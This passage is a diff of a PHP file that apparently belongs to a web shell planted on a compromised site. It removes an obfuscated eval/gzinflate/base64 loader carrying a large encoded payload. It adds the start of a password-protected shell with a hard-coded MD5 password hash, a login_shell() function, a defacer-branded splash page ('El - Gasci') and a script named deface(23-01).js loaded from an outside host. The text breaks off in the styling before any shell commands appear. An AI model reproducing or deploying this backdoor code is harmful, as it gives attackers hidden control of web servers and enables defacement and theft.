@@ -1,6 +1,757 @@
 <?php
-$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
-$Lix = "\x3dI54yF86\x62PEj\x41UNQE7Pz6ym\x41/T9\x2b\x2b5V//q40H/VJ1NFQnH\x43gxyG\x61l\x62VNT8kltY5\x2bm1qFO\x61tUuFd4p\x61mS\x2bGHTJuOoVe\x63SMv\x41yWYe\x61VLVR0DQpSr\x42qRL2\x2b\x43W\x62\x2bIxFQ8VMwp0l9PpYFG\x63RkL\x61djK5y0HvUmFTpylnP\x43fFIoi21tWY\x416xJqwLJOE\x42i0rwJoviVtOzf3KqQz0rUgvxmpVFsr\x41dssQKyDqUQt\x43Ue5mMWUfGXFYV2hk\x2bttms\x41x7lEMi\x2bx4\x421rExj12Y85rF\x42T6nkqqpFJ8\x629oXN8V7t5SWRuR9n\x62W\x61pj\x2bFT\x62iugun8q4e3D0pV\x41EK\x2bzYp\x43dZMf\x42PH\x41\x63suvI89\x62ZhG\x43QF13KrT0JKoZ7Vv\x63OlQZ6n\x2bK\x63I2wR\x2bD0N6/\x61Vs906IGyqW9/wLJN679\x62eZ1jq3WfpM0f6O9eTPoYj//xjH3O\x419evMoTLg\x43lvI2IW8Rr91/\x62swhqeD\x2b\x626J5o8Vzk\x62tGj\x2bF\x2b/KPMK9P6\x623lQe/4QXJ\x620wJr\x630XfD05\x41kNInW8w5K\x62GjV4l\x429\x61\x43\x61VX\x61\x63\x43QUel\x42Rl9TiYu/OJ0XZ3fnI9ftyu/\x61qgkU\x42ZM5\x625P\x63Vy1\x63Ej48\x62FkHlxm1\x2brFVi9h\x43MfnTos\x6306tXQOK\x61nsE\x63GJJ6RryiQvTQXTDs\x2b4oqo2\x42Tn\x43r\x43vzyM9hhkpU4LwF\x61146\x63Dn9qkTL52hs3un1V\x41YhpmS/0Yp2\x61JnpGokO\x63oDix8G207dWoL\x63PtP\x61\x61k\x61P\x62H3K6kkjFyuqmFei4\x63PDFoHE\x62\x63E\x63Q\x42VwsYqF\x634hpMfg/no\x42tf05\x43V\x42T\x43Ni\x61tr6V0tYpm\x62NZ9Uo1jni4i1G4eeRwLGTPUyUTxz5gkyInOXUONYyoLTR9GyJljLSjKDil319qmlH\x43ni0o9QQFFYl\x2bwzlq/MGyj19\x436xPU4z\x43\x2bFeeg/RnN3keuENtRmm\x61lD5zmGzK\x2b0r0lL5kMR1J6Zzr7FgOyQIulIS\x434E\x62Jy\x41qJp\x61SIJ2Ej1\x43\x4238\x61m\x43/G\x432eQSl8tGNle34gUqUzxEQr3kUQiQV51\x62j\x41gWNFFhJMF\x61ZwI/hllxzP/mYghJgyd\x616lG8qKJlpjsd0wz\x42qKFHwq9MRH3DlVw95nS\x42wl4YGFDYtLmmR2d\x41K6yJW\x61Q\x62e2hQ\x2bI92\x43r0i3\x43\x2bJsnO77TN\x41OUv1i\x43N7IsQ1\x42nY/xn6MY7W\x42TgvOIFZu\x61\x42iW\x2bvJ\x62wG8dVhwSoxuRg8mVDukM4Sh\x42ovLKI\x63mF53nsU\x62X5T01p5Lwemwr3O\x62xupyrfgnznkT99\x61RV\x61\x61e\x62ozyPFkZ5HItgOP9SYVtYpmT/pL0Y\x2brf2G/ngY4FIHn\x61xvr3Un40q\x43WeG\x42P\x43R\x43WShyotIN\x2bQqjo9jKXzkGUls3W7t3O0d\x2b2YlH5j\x62tvz2eWDZ7s9y7fe4O1M\x62p1VR8gettKlU5mJZYmSgGTy78Lq1dRu\x2bjP6j/WI\x43hu8Qn9NfpHXWrMR\x61UojG8hZ\x2b0GWygIFtSZsmdmop2\x61yK2V\x41Sd56L\x62XY5\x437qTyKLVsylGh\x61\x62pfZk\x43KUu7Vi\x62QRwL\x422WMr\x61G4F\x41UxqkirtqX4kS2sFdKz\x63iIluDWKd\x62g\x61e0lSO5u7sNtF3W\x63n9yE9oSD5EVy7d6yp\x43js41/uxJMUfqVW\x61s\x41\x61Vds\x61WXiG6iRyGGRW\x62ZJvEJzD7\x63Kzi2xWvGz\x41u\x43qn\x62xSNnFPtNp28gX5hZOQ7UW\x61YJhyUmjZo\x420VLMq7Rf2q\x2b\x41Sv\x43lkG9JUfQ\x63\x63\x62I9NS4Lh6OYS9Sx\x428wuKj/7vuY65Uxjj\x63Mi0JDMdK8PZ\x41Qh\x43mKT7dSO5doH\x2bpkgvG/gUXuH/gOIQPvL4zg8dSkp\x42kgdq5/Hg\x41f4l6zKydpD5I5sU\x43rzzERVzdXojgKKe6R\x41\x61uXPnQ1KlTrwPD5W\x42yNUhhm8qwgW83GoRN5JW\x429GHxpWV\x42epVZRe\x425\x2b/SxRvOj6ft5fm6UhZEoW1SyIXrK\x61\x41PqNYgHtE9\x61h\x2buw\x41Gn9um19gXfw\x43fNoYx\x42l4gJMtfno/\x43JFoUJsG/NW1w1UO/ggiq\x2bKNUZ1\x62kiKrfPwH6hU0l86M3lzp\x638GNizHny9XpzYtSkzqDuYk\x41zwHlgV\x61dm\x62YGpy8MmEf4SHmiDGQREn61M5U\x62WmKZwd\x61LvTKXYY4y\x42GNUu\x63INGnM7lIvY5PjES\x61/Ne90zq4gUhNl\x43\x63iLS9HIKIvr\x2bYUUQg2S8Ue9oi7\x43LX\x630lTO7s53N/V2rVKjDQ5qLpsXR\x63UGJrFXK\x42ynsMqZyrR\x42lv\x43TkVh\x41\x2bLJMWn9ImZ0Vv6oU0mslj\x61IuTXz61nY9jt\x62MGP21JoTt9pNyjKPE\x2b8RSRY/lXvK2DU5\x416\x43qorWPe6DiGn13n\x61EyYK5VtNZ/9\x416jnWgfPSpkx91\x42q1itL\x41w\x63nlX\x43i24Z/OgLyIHMkGpgm0Ieo15nIXqvlEq81\x43F\x2betX07iTPf/ij/KXHq\x43xv0g4k\x6385nf6R/ZJ2l5\x42X\x63w\x41\x63Q\x41\x42P26\x43OZ\x634lM5EYSyr3\x42HIs09Y7y8DYDTpYWXnK0u\x61Wdh\x43j0kyo3hjJKnUyIKmF\x61/vvmfjPQeOo9e7shj\x61jXW9\x61f\x41wTwQ6iS\x41Mw\x43Yk8XdT\x413q\x432\x43VfusejuFpD27dh\x61P\x63oPJl6ssVWmVSnV/8\x42ZJXDLhm49H9IN6L5gZrpwqI7pdL\x2b\x2bQz\x63xEG6gjo\x61484\x41fg\x63Rej\x42lUfP\x62RY10\x43HoigGIOJEjUZ/yhSZNX7P2V35FexIl0l\x63gGX\x42Z9t6M8nQ\x439W7L2\x42136gmWo6S/VE3sG4FVoSg\x423kuSR01EziNUs\x43wYLLUW9p\x41GuE6sIRMyt1VrGMWupMYY\x61fz\x2bxRPiW90EURUddkpKxHT\x41q3GR/pyDinL6Wvtr\x6299Oo\x2bPi9hupXoPgr\x2b7Ugwkte\x41t3dLTJWYKP\x61R9\x41M2F\x42400ZOTR\x41x2eNNejS4QxlGiiRPsj4lfIKSUTdXiyNXvLw6xQkn4Iqh\x62gK/\x43pypKXjUtveip\x63kg\x2bW\x2bS5twl\x62LL8RwF6KgM1hYEvTJuu1sm9oWKe\x61HwrZSDhdsZJtpDI\x41ppNH7\x63SL\x627pfTtSwTP7JOmsm3Yt3wkOiY17s\x2bge9wIyWHmpve\x610WHhjJxrg5QGr1xU5UhifPdj\x41YkU\x43q5iQ0tTKrkYr\x41hHzx1WTnV9Pjeo\x43zZm4\x430\x43DW\x41KKM2OQ\x63HiR2STrwTWY23U\x41l4\x42xNUQZ0/xNFl4OhY\x62YpdKWVPWFE4se\x43FilEk\x436mH9iNsE3S\x61y\x42rHGpjHJMggLmLw5\x62V63QtyI7336n3YE304EOP2Pzm\x43VE/\x41uefVSG3eL\x42\x2blz\x61Uzlqtyjk1GVu8K1GJjxQU/qKxSMo\x42vELZV\x62\x42qYfNL\x43kMflUpLRNRzH\x2bL1RJ\x62hkJWKM\x63kwf6RnekJEXO\x2bsJndxxXe\x2bZXzQTM\x43UpSMdVkSGm41iPfsIN1\x63SYg\x428HyzJ3VREiSkT/\x43yoiTe8IHWhi\x41Zv73jH\x2bgju\x2bond717HfW\x41\x43Dg\x42rLkKV/\x418QSPRsphUy\x41i/w7K85xh\x2bXfEEl\x638yeRuz\x41/x6SdfpPi\x42nkq\x63Y48f5Htp4Wy0\x61j1YKtejZwSF/R2gF79R\x41g\x63X6tWr\x41Qo\x43lW9\x415pUiftzD4T\x61QdIEn18kpXGvwun5Q/NwelFDLW\x41Egl9ZY\x62HggWl\x41og\x632f4eOkigGLu\x2b\x43sVuNuVpxhew0hXePR/n7JUUH4\x43uG2sMFfIO\x42uGRMtgjtDYu\x41DWZp/oXRLgf\x61wSym7qwkZPhsz\x43\x61sU8PMjMXjTU2V51yQNqK5Xur2MyL\x41m\x42Q\x42vgn\x61SQpgY5IpsNvoqwOJgzsp04i0j887RfZwT4WmwOQ4\x61m\x41\x438i0TRnIpU\x43r2r7IEFVdK86wjm0X6gQtjEQhNy\x42GWw\x635dGH2ORgY4GrPi\x63JNTRZgi012QPxtyO\x2b\x63QX63xy0YfFxLF\x42ML6n0J7rShxkE4neY96M0DZ\x63sEnlEPYNP6R/MxIqvz\x43qV7pI1WexevquShUwmKyu\x42GnnJm\x43q5s\x62e9\x41uSnd\x43YJN6nHe\x42IrD1\x43HutXozrMx7\x63\x43gJI/mNtV1fTrSmZLD\x62nJLZ6TQU\x2b\x413\x436eQOw\x61i\x43guD\x63fZ\x42wLLsLZ\x2boMDrT1MsS\x61r5s7t8Q\x420yoFttV11QYNjoWSqw\x62SMGNO\x437gvg7HEZLh8Mzp8\x62\x41pwk8nz0/\x42xTRD/qI7\x616Q\x62n1p\x2b7f\x41\x61TwsJgrFyUzh\x41O2tQNjK/\x42\x61v6\x43Oxy\x2bWrKvf6nh9r/e3D/rvr\x2b2goq1fvZ\x62LTM\x43\x63r\x42dxz5N6T2m760zxpNQ\x619R9\x426Tx3QU\x41lsO\x41zHoK\x43\x2bGZ4uh\x61w56tX1tz6LuMU/81\x41gF34FO6NI\x2bgpxuhEU1w\x61WQTDZKqIEmS8nkGx\x63Hf\x2b2rG2Mq\x43jF0DZ9\x2b0p\x63uST\x41U8\x41k\x62v5qi\x2bM9XQfU/QhJPs0/dXNvqL\x62yDE\x61\x61eXO0jy4Z20y8d\x61yu8kZwNq9DxN/PXpUWNVuTLdHhTlVxDh2\x42fgSP1ys2L0V8iHmmUHzkuh7xemnUG3zhzWTN/xNWYjPy\x41PHR10oq11DWoLeSKsY4z2ikQNg53HwqfHuLOq\x2b5J\x43wzjWx2GTw\x63QVD9fU\x2bnKP20Xv\x61kTO94Lq/x\x42Xf5o7H\x2bnIf\x634ZLPshv0\x41G\x62rl\x61\x41DeX/DVe7ZfO\x412Ux\x623\x41yy\x2bzJPWoKVzysiM1SFtEPZzKWfKRy8Og\x2bdvG9gMPevtjh7Z8\x43\x41S\x61KkSQV0\x2b8\x43unUxW4Ser3Pq\x2bKDUM67\x63u/RWi\x639u\x62iN\x43DFdSt/\x61plum\x43o03R/ee8dwh3nj4PtSzpJyyVOHUmvJtD\x62zx9s2JnMfJNLgUk/5T3yhXZfU\x63PZ\x2bgl5YnlD/93Rl200kMlns9TeZMJ\x61lny6n9v5mUrYWSLq72y6\x42kjhuep4MLO\x2bOiIwgsTk1ywekuOuY\x63W\x2b4pJMhJJ6vHz\x41\x42pvUXT\x41qFmS\x437gOX8xj76Umq1lsneJ123\x2bW7l7ZLQYeq/fjw7wx24\x43fW8\x41kg\x43LXLo4ZLM5pWGyzUXkdqpnM7to\x41\x62vorU4TI\x62\x61L\x629HQs\x62W71r01RMhXjSNq0KL1djkEqQTRU3lHs5Iy\x2b\x62jHlXZ\x63\x63k7jVEJs1jvTtr\x63uS/xp1D1fyT/DjZjGJgz8mZDqoV\x2bKnZGRoxj8I\x43w4L\x2be\x41niFypwWp5xS/vTteq\x62IpoVV9qnwIMIg9\x2bP\x2bq\x2bugf\x43nDF\x61\x2b\x429rPiI\x61H\x61NVz\x2bVl3vi\x61zE4\x2bEDLJLl\x42HrhrgJ\x63yoL\x2bghSGSrZt79UE\x63N/UOQT9vQ1\x61pgmHy\x42/I\x412FQ4Dst3TyTTpyo8U0j3wi4Pd7\x43GMW0GYw1pf0q\x41f6Zv849rTn0s2ii8LG\x43Yy\x42iFPhh5/Hx5TVQwiGXwu\x63MDHPdZjNxj\x2briSiZ\x63Uo/\x42Qi9uHPELJhoGv\x62WzMZIyOyw8y\x43sf9uZkGSWkIl\x2bFt9pFZS\x63P\x62Dpudi\x63/PlPNxLt1\x425ym48Lqf\x63\x633dspOU\x43T\x63NUtSR7\x42Vk\x61hfY\x62x6zlMJVlEH0GXuyz9nvK78R\x61L0wit\x61mdhnwQ2uu\x63\x61X9f\x61XIW\x2bMG2kzhf\x42nYZ0qq\x41/sGjuYtzy22\x62ulOjO/Nudt6oLSWqE\x429ONtwRtf2Wz\x41TyzO7utm0sZPZfIJVNG4\x61E\x62KmqQ/RuzGzrDY\x42\x41Dgr\x413\x61\x43\x63\x43v8ttZN\x63\x43uItv3GnQkMoRT34H6\x634uv\x43Q2w\x43EjgVzM\x61N0OvNzjlgFQGQ6\x63JNu\x42XMVwPVkHDXD4JziDj6lqg\x42qt1LMutjG\x2bFrHF2gN\x43Nuiy7NhR\x2bfWm9\x43k\x41\x42\x42S3I\x43Ex5\x61yQWZP6\x41uTt\x42IwVvvoQqTLDWKY0/9lN4m\x63hsqp\x62vL2\x62x9DwsZZP6PdVHoD/MFQ\x43\x41m1\x424D1oZ\x41DQ\x61UmkNPiG0TRpS\x63nNfE9430UPyN\x623mVEZH3od7\x618gOF\x61WV\x41yiPxE\x62\x62IO4567MO4G\x42SEzw\x43qK\x2b\x62\x42wj/ZxxSHly\x42q9RggZmHqWw8quR\x43Ozr\x639ZVQEo6FthmFH0qJ3IMps\x2b6F34\x42IdY9zWm\x42N4TU7z4SiYLqiYTOHuI\x43X\x61QYLT\x63LK1Y8xrS\x62yMT/Dh44\x41/qqQRo2ZGE\x61/QQEHU\x63\x435\x2b\x2bslwzt\x42IdNndPpG\x61XFJInf758E\x2bOypNe6JGV878\x62fV\x41\x61qDpjfmMKtXP01YOmoLVV8dOkVFYP4u1Wje\x61zeIgZ0x\x2btIXwjK0V\x63gOi\x43\x2bYQ\x61PG3TDz/9iqUg0D35yHK/V\x42\x42lP9hyyTy\x41Ie6oN\x41v\x6375\x2bx510qsx\x62oJmu\x43MkO5\x412J\x43r5\x63\x63/xsQgEZgmspSwIVxKj\x42Se4JFFuFvxKLR\x61\x42lSeTYu6\x622YUuQp\x43YSDrQLFm9hUqlX2umRuMYmoUEry4MPJhKKSQQr9Kg\x41NqDok\x62lwgMGD\x631\x61NEwGs9Y7FFj7LpiORv1lSwORowzswU04ORd6Vv\x41\x436yMV1K2mL\x42ITy9IkeMKTh\x2bH\x62jXZdzL/soVp\x2b\x61pwXZfUPdXpWPDj/30U2Z6k6pvklkTZYx\x43G7g\x61\x2bGluLy9E215GfV\x61VRsZYTDqSqH\x43tGq8\x41Eh\x2bm2woHqTpEqVI46kWVi\x2bD\x41l9vISXmoYtO4ThTwhumq88RQ6IqmMPUoY\x2b/rsuepoo\x43j\x63zkDSo0W\x62ND\x636e\x410TZ\x419Mngj4\x62G8r\x2b\x41Ix4ELtMlqueyvjQuM2MQvD\x42I5\x41kLJl1riVsZx\x61GNe\x2bwSP6w7v1ifFEzD\x62T3\x63qxkxy\x43\x43K2RG7VDhwN\x43iSZItueSpyw1QsZML7zzdT74JluHT0lTN\x61\x41DMT\x43UIown5Vwi/69TvFKrGYw\x62\x61hL\x43P\x62\x2bJ\x630SV\x615p\x41L\x42\x62\x41F6j9pJo\x42jZN4GVgrSDFp\x61Fy\x43FXPHi\x42wT2VjhF4h1Wj3\x635ipw31NIj\x412\x42FH4RGVqlI\x41sp\x63\x62u8m\x42TxEWW\x62qegW\x43nvguiznhPlGE9Q\x41\x42u3X4gzHseEOJtE\x2b3\x62GWNdNVU\x2bPLo2x/o1wF\x41pPX\x4220u\x63FYxeYNfhY\x439E\x626tI\x62MMusGpjRhfUTKZ8ihYmWL\x42Z/p\x61sdu0nd7RfXXJuP\x61ldTNHLZTIU/kqh5Z32EoMh\x42P2mn9m7ytJ4IEeSlEgpRjMHUUK\x43q\x424\x62ox\x42\x62IkpNtY6eSg\x627pREIUnJz\x41X/sjLXe\x62MT\x62N\x42s26\x42gRP0KxxMX55ENhdL0KWU\x62W2\x63EQ\x41iN\x41UfZh9E/\x41\x42\x631\x62QzIfFG4HwgvX\x43KudUL1\x4282Z\x2bU\x417uFPiht\x41EYDE\x43s\x43tF4EDiRwr\x61v7\x63Vu\x42x5wi\x63JQ\x423imVl\x2bq\x432JlG8wXqyfw\x43iMQ\x43uVnPKKrT4\x41\x62VFU0V8t2sDjMUT1Vp/Nt4d1uUFVWx\x43\x41\x42nNUzV8yuZW8SSM2U\x43\x62IvlNw2P8PjJh\x419hefOe2edgfJh\x43P\x41XgHYsv\x43tpjlm\x43n5\x42\x43fsKOQIuIf\x41v\x42XYJJLOomr\x42GVxV\x42lM\x41m\x428G3dDVOw\x43ed\x63Mx\x63mF8\x635yZRo\x417Ds0S22iwEDW5eI\x43\x432\x419FszJ2DOJgrFiMq/EoY4\x2bTf\x62HzJGhhLxYKdWyN6K\x62H0UwoJ\x61D\x41/tQDysdgSDGPmtQlWV\x63EhXn\x61x4OdDEn2E\x43iOR\x41kU9ru2IyEpfg53xPv\x62xE8dfPONG\x2bY\x42\x43NX30Ts\x42nlXx\x42EgeO\x41x\x63Zp\x43RN\x62X3Hu\x43SVFL7wZNpE8i8ihh\x61ynH1o7P5QyDdtE\x437u6In24lUxuLe\x2b9t5965\x627uzpO\x62f\x42/TPfH\x622Js6\x2bjPf/mt\x62y9O\x2bgme97VHD32F\x43\x2bqxOOzP9ltjZw9v7ezpn82jTft\x2b5nZ8GPZr\x636udfF31\x2bmXk\x629Ynndx5H3P8zz5vVkfv/\x63L8qf\x2b/P819y3P/8q5ve2zO\x2b9HPit3Ph\x637w768z1jv5\x2b3wx3\x63p7/fK//1xyzuHRpL8\x2b\x2bhNys\x62//lhXSuX\x2b88/\x621\x42\x2bpt\x2bdrw8Xk//xwJTdrG3\x2b0LX\x61o84m\x638ztY9x1nOY3k7XrO57j76J1q7\x43\x43uE\x61ihUtpKgQNrmmNndTUDQ\x41tpYLTTQJZkXzFJy406\x2bo1kEimQ\x2b96U7\x61\x63\x62do6Z5xwHtkr/0jm3d\x2boFjP305uNpTU\x41y0\x624GKOhRHWu\x42nuDexoGYxgm\x637O266kiGpqH\x42Hg\x41ks\x63PSnXyvVEKrl\x2b\x42Y6oQ4Dw6\x43UL\x41\x42DO8L\x61hOm2hHxQNvRT2K\x637sDxsWL6Z\x61\x62pVsPdsp6QF\x42\x2brOkZMzuNEDYH\x62dpKT\x61t8UZNoRzU4\x61pj5si1yrSXPLXDdSSIpg4KdQj\x63L\x412PgtHHR\x62vlw2\x62fnD\x2b\x41vQ1V6DKYg8s\x420hjkZUm6/k3wm/\x2b/wpXf0znvr5fGd6G\x43iLug\x432te06J\x2b8gTgOymZ4D7j0y\x62\x2bok//2t\x42PsJwzftmjIp\x41I\x41j\x43\x42fJf/8g/Xe7VHDOULytJlR7rrn/2K8NkkmyZhGE\x42WzRO\x41\x63x3eXigeMFY\x62PGu\x62136oOFVQ\x62oHNde\x41\x638WTz\x621UH4jztWU5njQJZ9\x431edFIPdeQ46rGdd5\x41wvrL7shfJH\x62gHp\x2bdwdxO\x41n\x428u\x41\x62R\x62GnX5OWfT2h3G\x63Rm3ZDYtPD4nM\x63gnrFt\x2bMoR7\x2bv\x61IGSfVIr4/O\x428Ope5\x42mN6fMy6R\x2bW2\x43/Z0I\x42/E\x614ryu/d\x61nkMQm2jY\x43UZwO6/\x41xufg3lpPwM6PUksRoXPm\x413/9W\x63208x3\x637\x43edYjloZ\x62f5QMhkvQlLojZ\x619y\x2bmYDU7O\x61mdNNMw2d\x610MoYgm\x42e73Fxmer2/76Nd42W\x416s94jwVj/v15G\x620/d\x62\x2b/GZHI6Xd2vNZvymd\x626/uHLTmt\x62de\x61QT9mHvI\x62f6w\x2bzD4O/0\x41r796N\x63\x62e\x63\x43vkp\x2b\x43PS\x43FQD089t97fj2\x63t\x41PZ2e\x62jXQHRJ2I8so78I\x62lYpx13hpm\x43H3\x61Le2stihT8sRmx\x41P\x62M4jz21jMeDWr7\x421\x42e\x62E67mtT\x62\x62PUw3EGyNNU7frt26\x2bsvHtQzs99dYeQ\x43y4euV\x6346qKMs0W\x63H8QvF314fr\x2bixG8NJ532KQ8\x63fDsrFyFHQxNDUn/\x2b\x41\x2bsw6\x41V7\x62w6JRu85VNr2rp\x61ez\x62391Xdr6Vr1xtyDiD\x61RdDZo09zsvD\x410Pvff/8m2/vVwKsLr\x42Q\x42\x63\x43Nsge\x42P2ojZ977\x41\x438\x62\x626\x63fx/6\x617duzJw7qzdeuDw3Z2\x62f\x62\x63kTMdtz2q\x42M\x627meNOuziNvt9/6V7uuxl\x63xYK\x42jTY\x63/\x2bWrNr2f\x61\x62JLYFrv\x41LYLJ\x43N9vPHt\x63KZkIR\x43gd19\x2b/n6kYIpEg\x63U5kI7QHx0kuRS7O\x61q0yd9x\x63Uuk4840WX\x62JOpKg/P9OfLrt\x62P3\x618Uu5hlhn\x42wJem\x62VGpGg5Rlhr\x42wJem\x62UG5Gg5\x42lhv\x42wJem\x62TGJHg5xkhz\x42wJe";
-eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
-exit;
+session_start();
+$password = "351eb72216ba1aa116edb5142d3a810d";
+
+function login_shell()
+{
 ?>
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>El - Gasci </title>
+<body>
+<style type="text/css">
+h1 {color: #333;font-size: 50px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Orbitron;}
+.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
+ 
+ 
+h2 {color: #333;font-size: 50px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Orbitron;}
+.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
+ 
+h3 {color: #333;font-size: 50px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Orbitron;}
+.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
+ 
+ 
+h4 {color: #FF0000;font-size: 20px;margin: 1px auto;text-align:center;text-transform:uppercase; font-family:Orbitron;}
+.neon {color: #FFFFFF;text-shadow: 0 0 5px #1ab4e7, 0 0 10px #1ab4e7, 0 0 30px #18a2d0, 0 0 45px #18a2d0, 0 0 60px #18a2d0;}
+ 
+ 
+.matrix {color: #FFFFFF; font-family:Arial, Courier, Monotype; font-size:10pt; text-align:center; width:10px; padding:0px; margin:0px;}
+.jokitz1{
+    text-align : center;
+    }
+.jokitz2{
+    text-align : center;
+    font-family : Courier;
+    }
+</style>
+<script type="text/javascript">
+ 
+<!--
+ 
+//Disable right click script
+ 
+ 
+var message="Dear Admin, Just Edit Index";
+ 
+///////////////////////////////////
+ 
+function clickIE() {if (document.all) {(message);return false;}}
+ 
+function clickNS(e) {if
+ 
+(document.layers||(document.getElementById&&!document.all)) {
+ 
+if (e.which==2||e.which==3) {(message);return false;}}}
+ 
+if (document.layers)
+ 
+{document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
+ 
+else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}
+ 
+document.oncontextmenu=new Function("return false")
+ 
+// -->
+ 
+</script>
+ 
+<!-- <script language="JavaScript1.2" type="text/javascript">
+ 
+function ClearError() {return true;}
+ 
+window.onerror = ClearError;
+ 
+</script> -->
+ 
+ 
+ <script type="application/javascript" language="javascript" src="https://nathanprinsley-files.prinsh.com/data-1/js/deface(23-01).js"></script>
+</head>
+<center>
+
+<img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjnvcSIYA3-yfsllWXeXa3WrOyIdYqY6TlvrJOPn4HVs1m8gI5duqdLXGR-aGRFWsLNHlaC9nUUyfRhBbYKIKZNQvNJqchvaIhalMzUEC1z3moD81tY1ks3T-RCoFZAzHbAx6Xknso2MgnPuBiV0ntSvZNoON8f0yHUPErsx5ojhXrpNf86BLJrIVkVTlA/s16000/download__19_-removebg-preview%20(1).png" style="padding-bottom: 2rem;">
+ 
+<br>
+<audio src="https://nathanprinsley-files.prinsh.com/data-1/mp3/jeremy-flick_anonymous.mp3" autoplay="1" loop="1"></audio>
+<h1 style="padding-bottom: 4rem;">El - Gasci</h1>
+ 
+ 
+<div id="matrix" class="auto-style8">Tell your mama the ghost is here.</div><br>
+<font face="courier new" color="Red" size"10" >Skill Speak Louder Than Words</font>
+ 
+ 
+<center>
+ 
+<hr width="550px" style='color:cyan;'>
+ 
+<link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>
+ 
+<span style='font: 15px Lucida Handwriting;size:15px;color:cyan;text-shadow: 0px 0px 50px;'><strong>
+<style type="text/css">
+<span style='font: 100px
+
+    body{
+  font-family: Trebuchet MS, Lucida Sans Unicode, Arial, sans-serif;
+  margin-top:0px;
+   background-repeat:no-repeat;
+  padding-top:26px;
+ }
+    #myContent, #myContent blink{
+        width:0%px;
+        height:0%px;
+        background:black;
+        color: #00FFFF;
+        font-family:IceLand;
+        font-size:20px;
+    }    
+    blink{
+        display:inline;
+    }
+    </style><br />
+    <script type="text/javascript">
+  var charIndex = -1;
+    var stringLength = 0;
+    var inputText;
+    function writeContent(init){
+     if(init){
+      inputText = document.getElementById('contentToWrite').innerHTML;
+     }
+        if(charIndex==-1){
+            charIndex = 0;
+            stringLength = inputText.length;
+        }
+        var initString = document.getElementById('myContent').innerHTML;
+  initString = initString.replace(/<SPAN.*$/gi,"");
+       
+       var theChar = inputText.charAt(charIndex);
+       var nextFourChars = inputText.substr(charIndex,4);
+       if(nextFourChars=='<br>' || nextFourChars=='<br>'){
+         theChar  = '<br>';
+         charIndex+=3;
+        }
+        initString = initString + theChar + "<span id='blink'>_</SPAN>";
+        document.getElementById('myContent').innerHTML = initString;
+ 
+        charIndex = charIndex/1 +1;
+  if(charIndex%2==1){
+             document.getElementById('blink').style.display='font: 100px';
+        }else{
+             document.getElementById('blink').style.display='inline';
+        }
+               
+        if(charIndex<=stringLength){
+           setTimeout('writeContent(false)',100);
+       }else{
+        blinkSpan();
+       }  
+   }
+       var currentStyle = 'inline';
+   function blinkSpan(){
+    if(currentStyle=='inline'){
+     currentStyle='none';
+    }else{
+     currentStyle='inline';
+    }
+    document.getElementById('blink').style.display = currentStyle;
+    setTimeout('blinkSpan()',9999999);
+   
+   }
+   </script>
+</html>
+<a><font color="maroon"><img src="https://zhyper-shel.info/imgzhyper/hazard.png" width="50" height="50"></font></font></a>
+
+<script type="text/javascript" src="https://cdn.prinsh.com/NathanPrinsley-effect/daun-berguguran.js" /></script>
+<script type="text/javascript">
+snowStorm.snowColor = '#6bd';
+snowStorm.flakesMaxActive = 96;
+snowStorm.useTwinkleEffect = true;
+</script>
+<div class="main-box">
+    <form action="" method="post">
+        <div class="login">
+            <div id="loginBox" class="login-box">
+                <input type="password" name="pass" placeholder="Password" required>
+                <input type="submit" name="submit" value="Touch">
+            </div>
+        </div>
+    </form>
+</div>
+<style>
+    *{
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+
+    }
+    @property --rot{
+        syntax: '<angle>';
+        inherits: false;
+        initial-value: 0deg;
+    }
+    body{
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        background: #000
+    }
+    .main-box{
+        position: relative;
+        width: 450px;
+        height: 200px;
+        background: repeating-conic-gradient(from var(--rot), rgb(255, 0, 0) 0%, rgb(255, 0, 0) 5%, transparent 5%, transparent 40%, rgb(255, 243, 136) 50%   );
+        filter: drop-shadow(0 15px 50px #000);
+        border-radius: 20px;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        animation: rotation 4s linear infinite;
+        transition: 0.5s;
+        margin: 10px 10px;
+    }
+
+    @keyframes rotation {
+        0%{
+          --rot: 0deg;
+        }
+        100%{
+            --rot: 360deg;
+        }
+    }
+
+    .main-box::before{
+        content: '';
+        position: absolute;
+        width: 100%;
+        height: 100%;
+        filter: drop-shadow(0 15px 50px #000);
+        border-radius: 20px;
+        animation: rotation 4s linear infinite;
+        animation-delay: 0.9s;
+    }
+    .main-box::after{
+        content: '';
+        position: absolute;
+        inset: 4px;
+        background: #000000;
+        border-radius: 15px;
+        border: 8px solid #000000;
+    }
+    .login{
+        position: absolute;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        inset: 60px;
+        flex-direction: column;
+        border-radius: 10px;
+        background: rgb(0, 0, 0);
+        box-shadow: inset 0 10px 20px rgb(19, 19, 19);
+        z-index: 1000;
+        color: rgb(255, 255, 255);
+        overflow: hidden;
+        inset: 40px;
+        box-shadow: 0 0 10px rgb(255, 255, 255);
+    }
+
+
+
+    .login-box, .login-shell-box{
+        position: relative;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-direction: column;
+        gap: 20px;
+        width: 70%;
+        transition: 0.5s;
+    }
+
+
+    .login-box h2, .login-shell-box h2{
+        text-transform: uppercase;
+        font-weight: 600;
